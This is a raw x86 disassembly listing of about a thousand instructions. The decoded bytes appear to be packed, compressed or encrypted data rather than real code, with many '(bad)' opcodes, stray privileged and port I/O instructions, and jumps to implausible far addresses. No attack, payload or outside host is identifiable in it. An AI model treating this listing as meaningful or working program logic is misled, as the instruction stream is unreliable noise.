  408f69:	cmc    
  408f6a:	loope  0x408fb6
  408f6c:	adc    DWORD PTR [ebp+eiz*2+0x6],0xffffff97
  408f71:	xor    edi,eax
  408f73:	xor    ah,BYTE PTR [ebx-0x21]
  408f76:	inc    edx
  408f77:	popf   
  408f78:	jl     0x408faa
  408f7a:	jge    0x408feb
  408f7c:	outs   dx,DWORD PTR ds:[esi]
  408f7d:	adc    ebp,DWORD PTR [edi-0x7f475b]
  408f83:	jae    0x408ffa
  408f85:	loope  0x408fe7
  408f87:	arpl   di,bp
  408f89:	ins    BYTE PTR es:[edi],dx
  408f8a:	sbb    al,0xb6
  408f8c:	push   ebx
  408f8d:	jne    0x40900c
  408f8f:	out    0x7e,eax
  408f91:	sbb    al,0x2e
  408f93:	xor    al,0x1f
  408f95:	mov    ebx,0xfbc01dcb
  408f9a:	add    bl,bh
  408f9c:	cdq    
  408f9d:	addr16 mov edx,ecx
  408fa0:	jae    0x409010
  408fa2:	inc    eax
  408fa3:	pop    ebp
  408fa4:	dec    esp
  408fa5:	pop    edx
  408fa6:	loopne 0x408fa3
  408fa8:	cmc    
  408fa9:	loop   0x408f8e
  408fab:	jne    0x408f87
  408fad:	je     0x408fd2
  408faf:	stos   DWORD PTR es:[edi],eax
  408fb0:	add    eax,0x107d6dbb
  408fb5:	push   ds
  408fb6:	retf   
  408fb7:	in     al,0x1e
  408fb9:	mov    ah,0x61
  408fbb:	xchg   ebp,eax
  408fbc:	jnp    0x408fbc
  408fbe:	iret   
  408fbf:	repnz sub eax,0x535ca5df
  408fc5:	call   0x7cbe262c
  408fca:	cmc    
  408fcb:	repnz or al,0x78
  408fce:	inc    esi
  408fcf:	mov    esp,0x71304ad3
  408fd4:	mov    gs,WORD PTR [edi+eiz*8-0x37]
  408fd8:	xor    eax,0xdb97df14
  408fdd:	xchg   edx,eax
  408fde:	inc    eax
  408fdf:	mov    esi,0x33c8656c
  408fe4:	out    0x77,eax
  408fe6:	ja     0x408ffb
  408fe8:	mov    dh,0x75
  408fea:	pushf  
  408feb:	dec    edx
  408fec:	hlt    
  408fed:	js     0x409002
  408fef:	xchg   esi,eax
  408ff0:	ins    BYTE PTR es:[edi],dx
  408ff1:	jb     0x40903a
  408ff3:	mov    bl,0x65
  408ff5:	imul   ebx,DWORD PTR [edx+0x14],0xa52afce4
  408ffc:	mov    ecx,0xaafb7a81
  409001:	loop   0x409029
  409003:	ds daa 
  409005:	inc    esi
  409006:	fs pop es
  409008:	jmp    0x17a53b80
  40900d:	push   ecx
  40900e:	cwde   
  40900f:	mov    ebp,0x6e6ee28e
  409014:	loop   0x409074
  409016:	mov    cl,0x1d
  409018:	dec    esp
  409019:	inc    eax
  40901a:	sbb    BYTE PTR [ebx-0x2c8bc8a6],0xc
  409021:	xor    bh,bh
  409023:	mov    dl,0x2
  409025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409026:	fucom  st(3)
  409028:	push   edx
  409029:	fld    st(5)
  40902b:	pop    esi
  40902c:	ficomp DWORD PTR [ebx]
  40902e:	mov    dl,0xfc
  409030:	xchg   edi,eax
  409031:	adc    ebp,ebx
  409033:	enter  0x986d,0x2b
  409037:	inc    eax
  409038:	lds    ebp,FWORD PTR [edx-0x67]
  40903b:	lds    ecx,FWORD PTR [edx+eax*2-0x450f6079]
  409042:	je     0x408fe9
  409044:	dec    BYTE PTR [ebx+0x2380c935]
  40904a:	mov    DWORD PTR [edi-0x7343e908],esp
  409050:	xor    eax,0x207521e3
  409055:	add    bl,BYTE PTR [ebx-0x653d4d16]
  40905b:	iret   
  40905c:	pop    es
  40905d:	fwait
  40905e:	test   al,0x9e
  409060:	mov    dl,0xe4
  409062:	cmp    al,0x6a
  409064:	xor    eax,ebp
  409066:	cmp    BYTE PTR [eax+edi*4],bl
  409069:	dec    esp
  40906a:	sbb    al,0xa6
  40906c:	pop    ds
  40906d:	ja     0x409080
  40906f:	xchg   ebp,eax
  409070:	xchg   ecx,eax
  409071:	and    BYTE PTR [ebx+edi*8+0x186b4cd0],dl
  409078:	pusha  
  409079:	cmp    ah,cl
  40907b:	sahf   
  40907c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40907d:	pop    edx
  40907e:	into   
  40907f:	xor    DWORD PTR [eax],0xf5b565e7
  409085:	xchg   esp,eax
  409086:	sti    
  409087:	lds    edi,FWORD PTR ds:0x68e942ca
  40908d:	out    dx,al
  40908e:	pop    esp
  40908f:	mov    dl,0xf2
  409091:	inc    bl
  409093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409094:	mov    cl,0xc0
  409096:	mov    ss,WORD PTR [eax+0x23]
  409099:	cli    
  40909a:	std    
  40909b:	ret    0x9d9b
  40909e:	jmp    DWORD PTR [ebx-0x7]
  4090a1:	out    0x6c,eax
  4090a3:	pop    eax
  4090a4:	push   esi
  4090a5:	ja     0x40903a
  4090a7:	sti    
  4090a8:	std    
  4090a9:	cwde   
  4090aa:	leave  
  4090ab:	cmp    ch,bl
  4090ad:	bound  ebp,QWORD PTR [ebx+edi*4]
  4090b0:	push   edx
  4090b1:	mul    DWORD PTR ds:0x3d1a6168
  4090b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090b8:	add    BYTE PTR [esp+0x446e561f],al
  4090bf:	aam    0x9f
  4090c1:	cmp    eax,0xfffffffa
  4090c4:	test   DWORD PTR [eax+0x565fe631],0xb63cac52
  4090ce:	in     eax,0xb5
  4090d0:	dec    ebx
  4090d1:	push   eax
  4090d2:	int3   
  4090d3:	jmp    0x8b1a:0x7ea939f3
  4090da:	xor    eax,0x9bf2289f
  4090df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090e0:	or     DWORD PTR [ecx-0x27],esp
  4090e3:	jl     0x4090ae
  4090e5:	sbb    eax,0xcae38c57
  4090ea:	xor    BYTE PTR [ecx],dh
  4090ec:	mov    eax,ds:0x9078bf1b
  4090f1:	adc    DWORD PTR [eax],eax
  4090f3:	in     eax,0xa4
  4090f5:	and    al,0xbf
  4090f7:	mov    al,0x1c
  4090f9:	jo     0x4090f9
  4090fb:	stos   DWORD PTR es:[edi],eax
  4090fc:	ror    DWORD PTR [ebp-0x76],cl
  4090ff:	cmc    
  409100:	adc    eax,0x7f35cddc
  409105:	imul   ebp,DWORD PTR [ebp+0x54],0xffffff8a
  409109:	push   ecx
  40910a:	sub    ecx,DWORD PTR [ecx-0x6b]
  40910d:	js     0x40916e
  40910f:	retf   0x918b
  409112:	int    0x2d
  409114:	je     0x4090cb
  409116:	push   ds
  409117:	lds    edi,FWORD PTR [ecx-0x1d]
  40911a:	aaa    
  40911b:	(bad)  
  40911c:	cmp    BYTE PTR [ecx],0xae
  40911f:	imul   edx,edi,0x7ef2d819
  409125:	ret    0x5558
  409128:	clc    
  409129:	adc    al,0x8e
  40912b:	fidiv  DWORD PTR [ebp+0x4a]
  40912e:	xor    al,0xe3
  409130:	or     bl,BYTE PTR [edx-0x7aee93da]
  409136:	hlt    
  409137:	xchg   DWORD PTR [esi-0xf],eax
  40913a:	inc    esp
  40913b:	sub    ebp,DWORD PTR [ecx]
  40913d:	out    0x7d,eax
  40913f:	out    0xf2,al
  409141:	out    0x84,eax
  409143:	(bad)  
  409144:	lds    ebx,FWORD PTR [edx]
  409146:	and    BYTE PTR [ebx+0x1a],al
  409149:	int3   
  40914a:	sub    esi,DWORD PTR [ebx-0x3b7993d1]
  409150:	loope  0x409100
  409152:	inc    ebp
  409153:	fst    QWORD PTR [edx+0x13]
  409156:	jnp    0x409120
  409158:	mov    bh,0x56
  40915a:	xchg   ebx,eax
  40915b:	ds dec ebp
  40915d:	loop   0x4090ee
  40915f:	xor    bh,BYTE PTR [esp+ebp*8-0x3d]
  409163:	cmp    eax,0xc32b23c
  409168:	(bad)  
  409169:	mov    ch,0x1e
  40916b:	mov    dh,0x9b
  40916d:	xor    dl,dl
  40916f:	in     eax,0xc7
  409171:	pop    esi
  409172:	dec    eax
  409173:	(bad)  
  409174:	(bad)  
  409175:	out    0x30,al
  409177:	scas   al,BYTE PTR es:[edi]
  409178:	leave  
  409179:	mov    dh,0x62
  40917b:	enter  0x9042,0x8e
  40917f:	xchg   BYTE PTR [ecx+0x7f3ba1a4],bl
  409185:	(bad)  
  409186:	pop    ebp
  409187:	and    DWORD PTR [eax-0x4b],0xffffff9d
  40918b:	cmp    cl,BYTE PTR [esi+0x50]
  40918e:	call   0xb9af0350
  409193:	xor    edi,DWORD PTR [esi-0x55088a64]
  409199:	iret   
  40919a:	clc    
  40919b:	xor    dl,BYTE PTR [eax]
  40919d:	mov    ah,0xf7
  40919f:	in     eax,0x69
  4091a1:	test   ah,ch
  4091a3:	mov    dl,bl
  4091a5:	icebp  
  4091a6:	xchg   esp,eax
  4091a7:	pop    esi
  4091a8:	pop    esi
  4091a9:	or     al,0xb1
  4091ab:	jl     0x4091f0
  4091ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091ae:	loop   0x40914a
  4091b0:	and    eax,0x5c254b28
  4091b5:	push   esi
  4091b6:	sub    DWORD PTR [edx+edi*8],edi
  4091b9:	shl    DWORD PTR [esi+eiz*2],1
  4091bc:	jno    0x40914e
  4091be:	ror    BYTE PTR [edx],0x29
  4091c1:	jmp    0xe3cf:0x582a282d
  4091c8:	mov    BYTE PTR [edi+0x20],al
  4091cb:	(bad)  
  4091cc:	int    0x74
  4091ce:	sahf   
  4091cf:	adc    ecx,DWORD PTR [ecx]
  4091d1:	mov    edx,0xd9fac267
  4091d6:	imul   edx,DWORD PTR [ebx+0x4],0x8
  4091da:	cmp    eax,DWORD PTR ss:[esi+0x43e586b8]
  4091e1:	sub    ah,BYTE PTR [esi+ecx*8]
  4091e4:	fld1   
  4091e6:	fnsave [esi-0x5]
  4091e9:	test   DWORD PTR [ecx-0x41],ebp
  4091ec:	outs   dx,BYTE PTR ds:[esi]
  4091ed:	std    
  4091ee:	xchg   ebp,eax
  4091ef:	pop    edx
  4091f0:	or     edi,DWORD PTR [eax-0x56314de8]
  4091f6:	iret   
  4091f7:	jmp    0x7de5:0x5783e904
  4091fe:	dec    esp
  4091ff:	pop    esi
  409200:	push   ss
  409201:	inc    ebp
  409202:	mov    BYTE PTR [edi+0x1c81f294],al
  409208:	imul   esi,DWORD PTR [ebx+0x37db2da2],0xcf4b8894
  409212:	ror    DWORD PTR fs:[esi],cl
  409215:	clc    
  409216:	push   ebx
  409217:	out    dx,al
  409218:	cs sbb esp,ecx
  40921b:	(bad)
  40921f:	inc    ecx
  409220:	jbe    0x4091b6
  409222:	pinsrw mm0,WORD PTR [eax],0x89
  409226:	outs   dx,BYTE PTR ds:[esi]
  409227:	loope  0x409258
  409229:	frstor [ecx-0x51]
  40922c:	pop    esp
  40922d:	test   DWORD PTR [edx+0x4903123b],esp
  409233:	mov    ah,0x4e
  409235:	sub    DWORD PTR [esp+edx*4-0x1f],0x6b
  40923a:	out    dx,eax
  40923b:	popf   
  40923c:	aas    
  40923d:	fld    DWORD PTR [ecx+0x39af3630]
  409243:	(bad)  
  409244:	arpl   di,bp
  409246:	(bad)  
  409247:	test   BYTE PTR [eax+ebx*2],0x53
  40924b:	and    edx,edx
  40924d:	in     eax,dx
  40924e:	stc    
  40924f:	mov    al,ds:0x9d14d08a
  409254:	jl     0x409285
  409256:	add    DWORD PTR [ecx-0x12c5afd],ecx
  40925c:	in     al,dx
  40925d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40925e:	cmp    cl,ah
  409260:	jge    0x4092ce
  409262:	enter  0xc193,0xdb
  409266:	test   eax,0xe18d38c6
  40926b:	sbb    al,0xe1
  40926d:	mov    ebp,0x28210b72
  409272:	daa    
  409273:	(bad)  
  409274:	hlt    
  409275:	add    al,0xf4
  409277:	fisub  WORD PTR [ecx+0x62]
  40927a:	cld    
  40927b:	jle    0x40921f
  40927d:	scas   eax,DWORD PTR es:[edi]
  40927e:	jae    0x40927c
  409280:	add    DWORD PTR ds:0xf0f846b7,ecx
  409286:	jmp    0x67f:0x634632d8
  40928d:	and    bl,dh
  40928f:	aad    0x10
  409291:	fnstsw WORD PTR [edi-0x3d57dcbb]
  409297:	push   esp
  409298:	loopne 0x40923e
  40929a:	outs   dx,DWORD PTR ds:[esi]
  40929b:	nop
  40929c:	pop    esp
  40929d:	outs   dx,BYTE PTR ds:[esi]
  40929e:	xchg   edi,eax
  40929f:	cmp    BYTE PTR ds:0x1c2aff84,dh
  4092a5:	xor    eax,0xa7b90418
  4092aa:	stc    
  4092ab:	leave  
  4092ac:	jno    0x4092ee
  4092ae:	xchg   esp,eax
  4092af:	inc    edi
  4092b0:	cs cmp edi,esp
  4092b3:	(bad)  
  4092b4:	sbb    esp,esp
  4092b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092b7:	inc    ecx
  4092b8:	xchg   ecx,eax
  4092b9:	sub    DWORD PTR [ebx],esi
  4092bb:	(bad)  
  4092bc:	int    0xec
  4092be:	xor    al,0x9
  4092c0:	push   edx
  4092c1:	jg     0x409298
  4092c3:	mov    edx,0x55158d25
  4092c8:	inc    edx
  4092c9:	mov    ebp,0xd7c48752
  4092ce:	ret    
  4092cf:	mov    ecx,0x1a964fb0
  4092d4:	inc    edi
  4092d5:	pop    ds
  4092d6:	hlt    
  4092d7:	in     eax,0x88
  4092d9:	xchg   esp,eax
  4092da:	push   ecx
  4092db:	cdq    
  4092dc:	stos   BYTE PTR es:[edi],al
  4092dd:	push   ds
  4092de:	mov    esi,0x4a32580b
  4092e3:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4092e5:	mov    ebp,0x9ad43980
  4092ea:	test   eax,0xcb31364f
  4092ef:	ret    
  4092f0:	popa   
  4092f1:	in     eax,0xd0
  4092f3:	shl    edx,1
  4092f5:	cmp    eax,0x633ad629
  4092fa:	dec    ecx
  4092fb:	shl    BYTE PTR [edx],cl
  4092fd:	inc    eax
  4092fe:	retf   0x7cd2
  409301:	cmp    al,0xd0
  409303:	test   ecx,edi
  409305:	cld    
  409306:	inc    esi
  409307:	icebp  
  409308:	(bad)  
  409309:	lods   eax,DWORD PTR ds:[esi]
  40930a:	push   ss
  40930b:	push   esi
  40930c:	pusha  
  40930d:	fcmovu st,st(6)
  40930f:	adc    BYTE PTR [ecx+ecx*4+0x72],dh
  409313:	adc    al,0x48
  409315:	xor    eax,0xbcc47abb
  40931a:	push   esp
  40931b:	adc    al,BYTE PTR [edi+0x12a959f]
  409321:	ja     0x4092d2
  409323:	(bad)  
  409324:	jmp    0x7d90:0x270998c
  40932b:	add    bl,BYTE PTR [ebp-0x52]
  40932e:	arpl   dx,di
  409330:	sti    
  409331:	fcomi  st,st(7)
  409333:	mov    edx,0x1f0f87b3
  409338:	int3   
  409339:	sub    eax,0x74c841e7
  40933e:	fild   DWORD PTR [edx]
  409340:	sub    al,0x6
  409342:	or     al,0x7a
  409344:	adc    eax,0xa83ab9fe
  409349:	add    DWORD PTR ds:0x74465487,ebp
  40934f:	aaa    
  409350:	mov    ah,0xd0
  409352:	(bad)  
  409353:	cmp    al,0x16
  409355:	pop    esi
  409356:	ss xchg ebp,eax
  409358:	mov    dl,0x2b
  40935a:	ror    BYTE PTR [esi+0x3d],1
  40935d:	sbb    eax,0xed534713
  409362:	and    ah,BYTE PTR [eax]
  409364:	push   ebp
  409365:	sub    al,BYTE PTR [ebp-0x789fcd1c]
  40936b:	pop    edx
  40936c:	cmp    eax,0x45288a07
  409371:	in     al,dx
  409372:	pusha  
  409373:	div    ah
  409375:	add    eax,0xd759742f
  40937a:	jmp    0x6c87:0x3e78abc
  409381:	mov    ss,WORD PTR [esp+ebx*8]
  409384:	push   eax
  409385:	push   edi
  409386:	test   BYTE PTR ss:[edx+0x52f8aff4],ah
  40938d:	jmp    0x4baf3302
  409392:	push   ds
  409393:	div    BYTE PTR [edi]
  409395:	fist   DWORD PTR [ebp-0x7f]
  409398:	out    0x1d,al
  40939a:	loop   0x40938d
  40939c:	je     0x4093a1
  40939e:	inc    eax
  40939f:	sbb    dl,dl
  4093a1:	xor    eax,0xd585c239
  4093a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093a7:	sub    dh,dl
  4093a9:	jp     0x409426
  4093ab:	clc    
  4093ac:	push   cs
  4093ad:	adc    DWORD PTR [esi+eax*2-0x41],esp
  4093b1:	int3   
  4093b2:	push   ss
  4093b3:	push   ds
  4093b4:	and    ebp,DWORD PTR [edx]
  4093b6:	cmp    ah,al
  4093b8:	inc    edx
  4093b9:	inc    ebp
  4093ba:	std    
  4093bb:	dec    esp
  4093bc:	call   0x3f4b31bd
  4093c1:	mov    al,0xfc
  4093c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093c4:	adc    al,0x51
  4093c6:	mov    cl,0x18
  4093c8:	mov    bl,0x92
  4093ca:	jae    0x40939d
  4093cc:	push   edx
  4093cd:	arpl   WORD PTR [ecx-0x52727397],ax
  4093d3:	stos   DWORD PTR es:[edi],eax
  4093d4:	mov    WORD PTR [ecx-0x56],fs
  4093d7:	xor    eax,0xb95056c4
  4093dc:	sahf   
  4093dd:	sub    edi,ecx
  4093df:	inc    esp
  4093e0:	adc    DWORD PTR [ebx],0xa13650e5
  4093e6:	mov    ebx,0x526930ae
  4093eb:	imul   eax,DWORD PTR [edx+0x36ed6592],0x5af953d8
  4093f5:	sub    al,0x42
  4093f7:	call   0x7295:0x81e4bc8f
  4093fe:	es cmp edx,edi
  409401:	jmp    0x83c45016
  409406:	test   BYTE PTR [esi],bl
  409408:	inc    ecx
  40940a:	data16 xor ch,dl
  40940d:	jecxz  0x409467
  40940f:	fisubr DWORD PTR [esi+0x53]
  409412:	sbb    BYTE PTR [ecx],0x6d
  409415:	mov    ebx,0x38b03dca
  40941a:	and    edx,DWORD PTR [ebx+0x6a697816]
  409420:	mov    edx,0xcbbdad72
  409425:	sbb    ebp,DWORD PTR ds:0xf8d23e3d
  40942b:	mov    eax,ds:0xdfcf8a3c
  409430:	pop    ecx
  409431:	ins    BYTE PTR es:[edi],dx
  409432:	cld    
  409433:	and    al,0x72
  409435:	xchg   BYTE PTR [edx+ecx*2],al
  409438:	lahf   
  409439:	add    al,0x8e
  40943b:	pop    ebx
  40943c:	ret    
  40943d:	(bad)  
  40943e:	adc    DWORD PTR [edi+0x48],ebx
  409441:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409443:	test   eax,0x449a728d
  409448:	xlat   BYTE PTR ds:[ebx]
  409449:	in     al,dx
  40944a:	(bad)  
  40944b:	loope  0x4094c3
  40944d:	in     al,0x37
  40944f:	cmp    ebx,DWORD PTR [edi]
  409451:	imul   ecx,DWORD PTR [edi-0x1e],0x29
  409455:	push   ebx
  409456:	push   ebp
  409457:	ja     0x409423
  409459:	out    dx,al
  40945a:	xchg   ebx,eax
  40945b:	nop
  40945c:	jbe    0x40949b
  40945e:	inc    DWORD PTR [esi+0x28c792a5]
  409464:	push   ds
  409465:	popf   
  409466:	push   edx
  409467:	inc    esi
  409468:	mov    al,ds:0x48eacbb2
  40946d:	arpl   WORD PTR [ecx-0x7426a322],dx
  409473:	jns    0x409436
  409475:	cwde   
  409476:	dec    edx
  409477:	or     edx,DWORD PTR [edx-0x48396996]
  40947d:	jp     0x4094aa
  40947f:	repz mov ds:0x742d4a26,al
  409485:	test   BYTE PTR [eax-0x319f0b43],ah
  40948b:	aad    0x12
  40948d:	(bad)  
  40948e:	mov    ebp,0x18a148c8
  409493:	(bad)  [edx+0x89d3e59]
  409499:	cmc    
  40949a:	bound  edx,QWORD PTR [edx+0x71cdeb0f]
  4094a0:	pop    ss
  4094a1:	and    eax,0xb923e2b4
  4094a6:	jg     0x4094a8
  4094a8:	push   edi
  4094a9:	ins    DWORD PTR es:[edi],dx
  4094aa:	push   0x30
  4094ac:	jg     0x409498
  4094ae:	push   edx
  4094af:	cdq    
  4094b0:	dec    edx
  4094b1:	cmc    
  4094b2:	imul   esp,esi,0x1a9bb00c
  4094b8:	retf   0x7cdb
  4094bb:	jns    0x4094d7
  4094bd:	jno    0x40946d
  4094bf:	mov    bh,0x16
  4094c1:	lods   eax,DWORD PTR ds:[esi]
  4094c2:	fnstcw WORD PTR [ebp-0x66]
  4094c5:	mov    esp,DWORD PTR [edi+0x7080433e]
  4094cb:	mov    bh,0x9c
  4094cd:	jl     0x409450
  4094cf:	sbb    dh,ch
  4094d1:	push   ebx
  4094d2:	(bad)  
  4094d3:	sti    
  4094d4:	inc    eax
  4094d5:	or     BYTE PTR [ebp-0xc],cl
  4094d8:	mov    esp,DWORD PTR [eax+0x1dfaf049]
  4094de:	xor    al,0xc4
  4094e0:	mov    cl,0x7c
  4094e2:	sub    eax,0x6ff114b8
  4094e7:	xchg   BYTE PTR [ecx],dh
  4094e9:	cmp    eax,0x1d0cce37
  4094ee:	mov    BYTE PTR [edi+ebx*8],bh
  4094f1:	adc    bl,ah
  4094f3:	mov    bl,0xd1
  4094f5:	cdq    
  4094f6:	and    eax,DWORD PTR es:[eax+0x74]
  4094fa:	jge    0x4094a4
  4094fc:	daa    
  4094fd:	xor    BYTE PTR [ecx],0x25
  409500:	out    dx,eax
  409501:	dec    ebp
  409502:	das    
  409503:	lods   al,BYTE PTR ds:[esi]
  409504:	jmp    0x4094e8
  409506:	xchg   ebp,eax
  409507:	je     0x40948c
  409509:	sub    dh,BYTE PTR [esp+eax*4+0x63aaf261]
  409510:	sbb    al,0xd5
  409512:	fptan  
  409514:	addr16 es pop edi
  409517:	hlt    
  409518:	adc    DWORD PTR [eax*2+0x703e25ab],ebx
  40951f:	std    
  409520:	add    al,0xa0
  409522:	push   ds
  409523:	jmp    0x4966:0x3db0df7d
  40952a:	lods   al,BYTE PTR ds:[esi]
  40952b:	adc    ebp,DWORD PTR ds:0x2fb61487
  409531:	cmp    ebx,edx
  409533:	jno    0x409570
  409535:	not    DWORD PTR [edx-0x54af4fa7]
  40953b:	ins    BYTE PTR es:[edi],dx
  40953c:	in     eax,dx
  40953d:	xchg   edi,eax
  40953e:	mov    ecx,0x55ec97e6
  409543:	sbb    eax,0xe7de0dc8
  409548:	mov    ds:0x52ab208c,eax
  40954d:	je     0x409545
  40954f:	pop    ss
  409550:	jge    0x4094fe
  409552:	fnsave ds:0xf13ae943
  409558:	mov    cl,0x7a
  40955a:	adc    ebp,DWORD PTR [eax-0x52744203]
  409560:	fnstsw WORD PTR [esi]
  409562:	sub    BYTE PTR [ebx-0x4e319624],bl
  409568:	pop    ebp
  409569:	jnp    0x409527
  40956b:	cmp    eax,0xdd9e57c
  409570:	rol    DWORD PTR [ebx-0x7b0f0d5f],0x40
  409577:	sar    DWORD PTR [edi+0x6c92a4a0],0x8e
  40957e:	sbb    eax,DWORD PTR [ebx]
  409580:	add    al,0xba
  409582:	shl    DWORD PTR [edi+0x7ab80d31],1
  409588:	hlt    
  409589:	lock and DWORD PTR [edx-0x755ac212],ecx
  409590:	jl     0x4095d7
  409592:	jne    0x4095e1
  409594:	cdq    
  409595:	shl    BYTE PTR [edx-0x68],cl
  409598:	ret    
  409599:	inc    esp
  40959a:	(bad)  
  40959b:	aaa    
  40959c:	dec    esi
  40959d:	cs enter 0xc08f,0x67
  4095a2:	mov    ch,0x73
  4095a4:	test   BYTE PTR [edx],0x98
  4095a7:	rol    BYTE PTR [edx+0x5d255e4b],0xec
  4095ae:	sbb    esp,DWORD PTR [ebp+0x3b]
  4095b1:	mov    eax,ds:0x3511fc03
  4095b6:	sub    eax,0xdf91948c
  4095bb:	push   eax
  4095bc:	cwde   
  4095bd:	and    DWORD PTR [edx+0x74],ebx
  4095c0:	daa    
  4095c1:	hlt    
  4095c2:	test   al,0xa8
  4095c4:	or     al,0x82
  4095c6:	dec    ebp
  4095c7:	cwde   
  4095c8:	stos   BYTE PTR es:[edi],al
  4095c9:	fisubr WORD PTR [ecx+0x7]
  4095cc:	dec    esp
  4095cd:	aas    
  4095ce:	add    BYTE PTR [esi+0x42dfdb86],cl
  4095d4:	sbb    BYTE PTR [edx],al
  4095d6:	imul   ecx,DWORD PTR [edx+0x165431be],0x6a45f35
  4095e0:	sbb    DWORD PTR [ebp+0xe74b2bd],eax
  4095e6:	mov    al,0xef
  4095e8:	mov    ebx,0x9edd5178
  4095ed:	xchg   DWORD PTR [edx],ebx
  4095ef:	mov    edx,0x4f11164d
  4095f4:	adc    DWORD PTR [ecx+0x5d3ce0b8],0x58
  4095fb:	daa    
  4095fc:	xor    eax,edx
  4095fe:	retf   
  4095ff:	dec    ebx
  409600:	or     al,0x76
  409602:	sub    al,0x9
  409604:	cmp    al,0x9
  409606:	adc    bl,BYTE PTR [ecx+0x4a8bdef7]
  40960c:	jge    0x409657
  40960e:	pop    ds
  40960f:	iret   
  409610:	sbb    ebp,DWORD PTR [ecx]
  409612:	mov    esi,0x857f45fd
  409617:	and    eax,0x2c865ba2
  40961c:	sub    BYTE PTR [edi],ch
  40961e:	mov    edx,0x216ea036
  409623:	mov    ecx,0xf21d1bf4
  409628:	pushf  
  409629:	adc    bh,BYTE PTR [ecx+0x7ece2468]
  40962f:	mov    esp,0x1c07b820
  409634:	jmp    0xdd1b:0x542964a2
  40963b:	pop    edx
  40963c:	push   ds
  40963d:	mov    cs,WORD PTR [ebx-0x41ed0e44]
  409643:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409644:	ret    
  409645:	mov    ds:0x635a4086,eax
  40964a:	cs jbe 0x4095f7
  40964d:	stos   DWORD PTR es:[edi],eax
  40964e:	call   0xa728:0xc05fcb52
  409655:	rol    ecx,cl
  409657:	fidiv  DWORD PTR [edi+0xccee080]
  40965d:	cmp    DWORD PTR [eax-0x56],ebx
  409660:	xor    edx,ecx
  409662:	sti    
  409663:	(bad)  
  409664:	and    BYTE PTR [ecx-0x60],dl
  409667:	mov    ecx,0x9dae728a
  40966c:	xlat   BYTE PTR ds:[ebx]
  40966d:	mov    ecx,esp
  40966f:	shl    DWORD PTR [ecx],0xbe
  409672:	cli    
  409673:	in     al,0xf6
  409675:	cld    
  409676:	test   BYTE PTR [ecx-0x46efc650],ah
  40967c:	dec    edx
  40967d:	jp     0x409689
  40967f:	sti    
  409680:	lahf   
  409681:	stos   DWORD PTR es:[edi],eax
  409682:	push   0xfffffff3
  409684:	cmc    
  409685:	retf   0xf694
  409688:	xor    eax,0x4573c9ff
  40968d:	inc    ebx
  40968e:	mov    cl,0x98
  409690:	jp     0x4096ae
  409692:	xchg   bl,al
  409694:	int3   
  409695:	sahf   
  409696:	xchg   ebx,eax
  409697:	popf   
  409698:	push   cs
  409699:	sub    eax,0xb9c1436e
  40969e:	and    BYTE PTR [ebx],bh
  4096a0:	cmp    DWORD PTR [ebx+0x18bbcf5c],eax
  4096a6:	dec    esi
  4096a7:	add    al,0xd8
  4096a9:	push   es
  4096aa:	sahf   
  4096ab:	jbe    0x409688
  4096ad:	(bad)  
  4096ae:	loop   0x409632
  4096b0:	(bad)  
  4096b1:	sub    DWORD PTR [edx],eax
  4096b3:	add    al,0x1a
  4096b5:	imul   esi,DWORD PTR [ecx+0x5b3c511d],0xc187a0f
  4096bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096c0:	dec    edx
  4096c1:	cmp    BYTE PTR [edi+0x688c2bba],dh
  4096c7:	pop    edx
  4096c8:	test   BYTE PTR [esi-0x4e],ch
  4096cb:	sub    DWORD PTR [esi],0x602f55
  4096d1:	cmp    DWORD PTR [esi-0x78fa0086],edi
  4096d7:	js     0x409660
  4096d9:	inc    esi
  4096da:	scas   eax,DWORD PTR es:[edi]
  4096db:	fistp  DWORD PTR [ebx+ecx*1-0x8]
  4096df:	dec    ebx
  4096e0:	aam    0xeb
  4096e2:	daa    
  4096e3:	dec    eax
  4096e4:	unpcklps xmm2,XMMWORD PTR [ebx-0x5005936f]
  4096eb:	jmp    0xdf37c843
  4096f0:	dec    ebp
  4096f1:	pop    eax
  4096f2:	push   ds
  4096f3:	scas   eax,DWORD PTR es:[edi]
  4096f4:	add    DWORD PTR [ecx+esi*4-0x1],edx
  4096f8:	mov    edi,0x3669550
  4096fd:	stc    
  4096fe:	neg    DWORD PTR [ebp+0x42f58d3a]
  409704:	jb     0x4096ab
  409706:	popa   
  409707:	vmwrite esp,ebp
  40970a:	sti    
  40970b:	cmp    al,BYTE PTR [ecx+0x58]
  40970e:	push   edi
  40970f:	in     eax,0xfe
  409711:	adc    bl,cl
  409713:	mov    ds:0x476a0a11,al
  409718:	popa   
  409719:	sbb    edx,eax
  40971b:	add    al,0xb9
  40971d:	(bad)  
  40971e:	mov    ecx,0x9edebc9c
  409723:	mov    ?,WORD PTR [ebp-0x62417bbc]
  409729:	adc    esp,DWORD PTR [eax+0x47]
  40972c:	jmp    0xc09ddb67
  409731:	vunpcklpd ymm5,ymm5,ymm0
  409735:	out    dx,al
  409736:	mov    esi,edi
  409738:	mov    edx,0x9a3ff2ef
  40973e:	repz dec esp
  409740:	jmp    0x4096eb
  409742:	pop    ds
  409743:	xor    BYTE PTR [ebx+0x711464a4],dh
  409749:	cmp    ecx,DWORD PTR ds:0x1a7005cd
  40974f:	rol    cl,cl
  409751:	push   0x4925adf8
  409756:	xor    al,0xbd
  409758:	adc    al,0xa6
  40975a:	hlt    
  40975b:	inc    edx
  40975c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40975d:	lahf   
  40975e:	cmp    ecx,esi
  409760:	dec    esi
  409761:	cmp    eax,0xf6345cad
  409766:	cmp    bl,dl
  409768:	imul   ebx,DWORD PTR [edx-0x2011eb81],0x0
  40976f:	cmp    esp,DWORD PTR [esi]
  409771:	push   cs
  409772:	cwde   
